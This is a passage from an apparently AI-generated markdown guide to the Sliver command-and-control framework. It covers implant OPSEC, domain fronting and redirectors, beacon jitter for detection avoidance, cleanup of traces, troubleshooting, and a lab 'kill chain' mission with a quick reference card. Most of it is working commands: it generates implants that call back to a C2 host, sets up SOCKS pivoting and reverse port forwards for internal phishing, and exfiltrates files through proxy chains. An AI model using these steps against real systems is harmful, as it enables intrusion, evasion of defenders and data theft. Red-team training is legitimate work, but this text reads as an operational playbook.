│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          │
│  │   DETECT    │    │   SANDBOX   │    │   CLEANUP   │          │
│  │             │    │             │    │             │          │
│  │ VT check    │    │ VM detect   │    │ Log clear   │          │
│  │ Watchtower  │    │ Sleep/      │    │ File wipe   │          │
│  │             │    │   beacon    │    │ Timestomp   │          │
│  │ Test vs     │    │ Environment │    │ Registry    │          │
│  │ target AV   │    │  checks     │    │ cleanup     │          │
│  └─────────────┘    └─────────────┘    └─────────────┘          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

### Implant OPSEC Summary Table

| Concern | Sliver | Metasploit | Kali Tools |
|---------|--------|------------|------------|
| **Default implant names** | Use `--name` with blend-in names | Use `-n` custom name | N/A |
| **Command-line artifacts** | `--skip-symbols` | N/A | `strip` |
| **Binary signatures** | Regenerate per target | Different payload each time | Custom build |
| **Memory artifacts** | `--evasion`, test vs EDR | `migrate`, `metsrv` mods | BOF, donut |
| **Disk artifacts** | `rm`, memory-only execution | `rm`, in-memory | `srm`, `shred` |
| **Network patterns** | `--jitter`, DNS/WG | `SessionTimeout`, DNS | Redirectors |
| **Shellcode detection** | `--shellcode-compress`, `--shellcode-entropy 3` | `msfvenom -e -i 5` | peCloak, UPX |
| **Build detection** | Watchtower VT/X-Force | Manual VT check | `vt-cli` |
| **Staging exposure** | `--aes-encrypt-key` | Staged payload | Encrypted staging |

---

### Infrastructure OPSEC

```sliver
# 1. Never expose Sliver server directly — use redirectors
# Redirector (Nginx example):
# server { listen 443 ssl; location / { proxy_pass http://SLIVER_IP:80; } }

# 2. Use domain fronting (HTTPS with CDN — use host-header advanced option)
generate --https cdn.example.com?host-header=legitimate.cdn.com --format exe

# 3. Rotate infrastructure
# - Use multiple redirectors
# - Rotate DNS records between engagements
# - Burn C2 domains after detection

# 4. Enable DNS fallback
generate --http 10.10.10.10 --dns c2.example.com --format exe

# 5. WireGuard for encrypted C2
generate --wg 10.10.10.10 --format exe
```

### Detection Avoidance

```sliver
# Slow beacon interval (OPSEC-friendly)
generate --name slow --http 10.10.10.10 --beacon 300 --jitter 30 --format exe

# Jitter adds randomness to callbacks (percentage)
# --beacon 300 --jitter 30  →  callbacks every 210-390 seconds

# Use DNS for low-and-slow operations
generate --name dns-slow --dns c2.example.com --beacon 600 --jitter 50 --format exe
```

### Cleanup

```sliver
# On the implant, before disconnecting:
rm C:\Users\Public\tool.exe          # Remove dropped tools
rm C:\Windows\Temp\implant.exe        # Remove the implant binary

# Kill the implant cleanly
die                                    # Self-terminate

# On the server:
jobs kill <job-id>                     # Stop listeners
implants --verbose                      # Review generated implants
loot                                    # Review exfiltrated data
```

### Logging

```bash
# Sliver logs everything by default
# Check logs in: ~/.sliver/logs/

# Event logs contain:
# - Session connections/disconnections
# - Command history
# - File transfers

# Disable debug logging in production ops
generate --name prod --http 10.10.10.10 --format exe  # No --debug flag

# For lab practice, enable debug for troubleshooting
generate --name debug-implant --http 10.10.10.10 --format exe --debug
```

---

## 11. Troubleshooting

### Common Issues & Fixes

#### Implant Not Calling Back

```bash
# 1. Check if the listener is running
jobs

# 2. Verify the listener is on the correct interface/port
# The implant must be able to reach the listener IP

# 3. Check firewall on C2 server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 4443/tcp

# 4. Verify DNS records (for DNS C2)
dig c2.example.com A
dig c2.example.com NS

# 5. Test connectivity from target
ping 10.10.10.10
curl http://10.10.10.10  # If HTTP listener
```

#### Server Won't Start

```bash
# Check if port is already in use
sudo lsof -i :31337
sudo lsof -i :1337

# Kill stale processes
kill -9 <pid>

# Clear and restart (nuclear option — loses all data)
rm -rf ~/.sliver/
sliver-server  # Re-initialize
```

#### Client Connection Failed

```bash
# Verify operator config is valid
cat ~/.sliver-client/<name>.cfg

# Check server is reachable
nc -zv <server-ip> 1337

# Regenerate operator config
sliver-server operator --name agustin --lhost <SERVER_IP> --save ./

# Re-import
sliver import agustin.cfg
```

#### mTLS Certificate Errors

```bash
# Regenerate certificates
rm ~/.sliver/ca.crt ~/.sliver/ca.key
sliver-server  # Auto-regenerates on next start

# Re-generate operator configs after cert regeneration
sliver-server operator --name agustin --lhost <SERVER_IP> --save ./
```

#### Armory Install Fails

```sliver
# Update the armory index
armory update

# If packages fail to download, check network connectivity
# Armory uses GitHub releases

# Install specific version
armory install <package>@<version>
```

#### "Session Closed Immediately"

```bash
# Common causes:
# 1. Implant detected and killed by AV/EDR
# 2. Target host lost connectivity
# 3. Firewall blocked callback

# Check with debug implant
generate --name debug-implant --http 10.10.10.10 --format exe --debug

# Review server logs
tail -f ~/.sliver/logs/sliver.log
```

> [!tip] Debug Mode
> When troubleshooting, always generate implants with `--debug`. This gives verbose output on the target side, helping you identify connection issues.

---

## 12. Practice Mission Scenario

> [!note] Lab Exercise
> This is a CTF-style exercise for your lab environment. Do NOT attempt on systems you don't own.

### Mission: "Operation Shadow Reach"

**Objective**: Compromise a Windows target, escalate privileges, pivot to an internal Linux server, and exfiltrate a flag file.

**Lab Setup**:
- Sliver server: `10.10.10.10` (your C2)
- Target 1 (Windows): `192.168.1.50` (direct access)
- Target 2 (Linux): `192.168.1.100` (internal, only reachable from Target 1)

#### Phase 1: Initial Access

```sliver
# Start listeners
sliver > http --lhost 10.10.10.10 --lport 80
sliver > dns --domains c2.lab.local --lhost 10.10.10.10

# Generate implant for Windows
sliver > generate --name shadow-win --http 10.10.10.10 --dns c2.lab.local --format exe --arch amd64

# Transfer to Target 1 using your preferred method
# Execute on Target 1

# Verify session
sliver > sessions
# [+] Session 1 SHADOW_WIN - 192.168.1.50:49812 (DESKTOP-LAB) - windows/amd64
```

#### Phase 2: Reconnaissance

```sliver
sliver > use 1

# Who are we?
sliver (SHADOW_WIN) > whoami
sliver (SHADOW_WIN) > getuid

# What's the system?
sliver (SHADOW_WIN) > shell systeminfo

# Network layout
sliver (SHADOW_WIN) > ifconfig
sliver (SHADOW_WIN) > netstat
sliver (SHADOW_WIN) > ps

# Check for interesting files
sliver (SHADOW_WIN) > ls C:\Users\
sliver (SHADOW_WIN) > cat C:\Users\Public\notes.txt
```

#### Phase 3: Privilege Escalation

```sliver
# Try getsystem (if running as admin-level user)
sliver (SHADOW_WIN) > getsystem

# If not admin, look for escalation paths
sliver (SHADOW_WIN) > shell whoami /priv

# Install and run privilege escalation checker
sliver (SHADOW_WIN) > armory install watson
sliver (SHADOW_WIN) > execute-extension watson

# After escalating, migrate to a stable process
sliver (SHADOW_WIN) > ps
sliver (SHADOW_WIN) > migrate <explorer.exe-pid>
```

#### Phase 4: Lateral Movement & Pivoting

```sliver
# Set up a SOCKS5 proxy through Target 1
sliver (SHADOW_WIN) > socks5 --bind 127.0.0.1:1080

# Now use the SOCKS5 proxy to reach Target 2
# In another terminal:
# proxychains ssh user@192.168.1.100

# Or use Sliver's built-in SSH
sliver (SHADOW_WIN) > ssh --user labuser --password labpass 192.168.1.100

# Or port-forward directly
sliver (SHADOW_WIN) > portfwd add --bind 127.0.0.1:2222 --forward 192.168.1.100:22

# Generate a Linux implant for Target 2
sliver > generate --name shadow-lin --http 10.10.10.10 --format elf --arch amd64

# Upload and execute on Target 2 (via SSH or proxy)
sliver (SHADOW_WIN) > upload /path/to/shadow-lin /tmp/shadow-lin
# SSH to Target 2 and execute
```

**Bonus: Reverse Port Forwarding Scenario**

```sliver
# Scenario: You have a custom exploit server on your attacker machine (10.10.10.10:9090)
# You want to serve it from the compromised Windows host so internal targets see a "local" IP.

# 1. On attacker: start a payload server
(attacker) $ python3 -m http.server 9090 --directory /payloads/

# 2. On implant: expose it as port 80 on the Windows host
sliver (SHADOW_WIN) > rportfwd add --bind 0.0.0.0:80 --forward 10.10.10.10:9090

[*] Reverse port forwarding 0.0.0.0:80 -> 10.10.10.10:9090

# Now anyone on 192.168.1.0/24 browsing to http://192.168.1.50 sees your payload server
# The traffic appears to originate from an internal host — great for phishing/internal ops

# 3. When done, clean up
sliver (SHADOW_WIN) > rportfwd remove 1
```

**Bonus: Multi-Hop Pivoting Scenario**

```sliver
# Scenario: Target 2 is on an internal subnet (10.0.0.0/24) only reachable from Target 1.
# Target 3 (172.16.0.25) is on a sensitive subnet behind Target 2.

# Step 1: SOCKS5 through Target 1
sliver (SHADOW_WIN) > socks5 --bind 127.0.0.1:1080

# Step 2: Upload Linux implant for Target 2 via SOCKS5
# In another terminal:
$ proxychains scp ./shadow-lin labuser@10.0.0.10:/tmp/
$ proxychains ssh labuser@10.0.0.10 "chmod +x /tmp/shadow-lin && /tmp/shadow-lin"

# Step 3: Target 2 calls back — interact with it
sliver > use 2
sliver (SHADOW_LIN) > socks5 --bind 127.0.0.1:1081

# Step 4: Configure proxychains for two hops
# /etc/proxychains.conf:
#   socks5 127.0.0.1 1080
#   socks5 127.0.0.1 1081

# Step 5: Scan and access Target 3 (deep network)
$ proxychains nmap -sT -p 22,80,443,445 172.16.0.25
$ proxychains ssh admin@172.16.0.25

# Step 6: Exfiltrate data back through the chain
$ proxychains scp admin@172.16.0.25:/opt/app/config.yml ./
```

#### Phase 5: Exfiltration

```sliver
# Find the flag
sliver (SHADOW_WIN) > ls C:\Users\Administrator\Desktop\
# Or on Linux target:
sliver > use 2
sliver (SHADOW_LIN) > ls /root/
sliver (SHADOW_LIN) > cat /root/flag.txt

# Download the flag
sliver (SHADOW_LIN) > download /root/flag.txt

# Store in loot
sliver > loot add --name "flag.txt" --type document ~/.sliver/downloads/flag.txt

# Verify
sliver > loot
```

#### Phase 6: Cleanup

```sliver
# Remove tools and implants from targets
sliver (SHADOW_WIN) > rm C:\Users\Public\shadow-win.exe
sliver (SHADOW_WIN) > rm C:\Users\Public\tools\*

# Kill the implants cleanly
sliver (SHADOW_WIN) > die
sliver (SHADOW_LIN) > die

# Stop Sliver listeners
sliver > jobs
sliver > jobs kill 1
sliver > jobs kill 2

# Review what you left behind
sliver > loot
sliver > creds
```

> [!success] Mission Complete
> You've practiced the full kill chain: initial access → recon → privilege escalation → lateral movement → exfiltration → cleanup. Review your OPSEC: were there any artifacts left? Could the C2 traffic have been detected? These are the questions that matter in real engagements.

---

## 13. Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│                    SLIVER C2 QUICK REF                      │
├─────────────────────────────────────────────────────────────┤
│ Start/Connect                                               │
│  sliver-server daemon   # Start server                     │
│  sliver                 # Connect client                    │
├─────────────────────────────────────────────────────────────┤
│ Listeners                                                   │
│  http  --lhost 0.0.0.0 --lport 80                          │
│  https --lhost 0.0.0.0 --lport 443 --cert x --key y        │
│  dns   --domains c2.example.com --lhost 0.0.0.0             │
│  mtls  --lhost 0.0.0.0 --lport 4443                         │
│  wg    --lhost 0.0.0.0 --lport 53                           │
│  jobs                  # List listeners                     │
│  jobs kill <id>        # Stop listener                      │
├─────────────────────────────────────────────────────────────┤
│ Implants                                                    │
│  generate --http IP --format exe        # Windows EXE      │
│  generate --dns DOMAIN --format elf      # Linux DNS        │
│  generate --wg IP --format shellcode     # WG shellcode     │
│  generate --http IP --beacon 60          # Beacon mode      │
│  profiles new / generate                # Profile mgmt     │
│  implants                               # List builds       │
├─────────────────────────────────────────────────────────────┤
│ Interaction                                                 │
│  sessions / beacons   # List active                        │
│  use <id>             # Interact                           │
│  background           # Return to menu                     │
│  shell <cmd>          # Run shell command                  │
│  upload / download    # File transfer                      │
│  ps / ifconfig / netstat  # Recon                          │
│  migrate <pid>        # Process migration                  │
│  getsystem            # Escalate to SYSTEM                 │
│  screenshot           # Grab screenshot                    │
├─────────────────────────────────────────────────────────────┤
│ Pivoting                                                    │
│  socks5 --bind 127.0.0.1:1080                              │
│  socks5 stop <id>                                       │
│  portfwd add --bind L:P --forward R:P                      │
│  portfwd add --remote --bind 0.0.0.0:P --forward R:P      │
│  rportfwd add --bind 0.0.0.0:P --forward ATTACKER:P      │
│  rportfwd remove <id>                                   │
│  ssh --user U --password P <host>                          │
├─────────────────────────────────────────────────────────────┤
│ OPSEC                                                       │
│  --beacon N --jitter M    # Slow C2                        │
│  --skip-symbols           # Strip symbols                   │
│  --evasion                # Evasion flags                   │
│  die                      # Self-terminate                  │
│  rm <path>                # Clean up files                  │
├─────────────────────────────────────────────────────────────┤
│ Extensions                                                  │
│  armory update            # Update index                    │
│  armory search <term>     # Find packages                  │
│  armory install <pkg>     # Install package                │
│  armory list              # List all available             │
├─────────────────────────────────────────────────────────────┤
│ Stagers                                                     │
│  stage-listener --url http://IP:P --profile <name>         │
│  stage-listener --url tcp://IP:P --profile <name>          │
│  profiles new --name <name> --format shellcode ...         │
├─────────────────────────────────────────────────────────────┤
│ Monitoring                                                  │
│  mcp start --transport http  # Start MCP server            │
│  monitor start               # Start VT/X-Force monitoring │
│  builders                    # List external builders      │
│  generate --external-builder # Offload build               │
└─────────────────────────────────────────────────────────────┘
```

---

*Guide generated by clawd 🦞 — Last updated: 2026-05-02*
*Sliver v1.7.3 — [GitHub](https://github.com/BishopFox/sliver) — [Docs](https://sliver.sh/docs) — [Releases](https://github.com/BishopFox/sliver/releases)*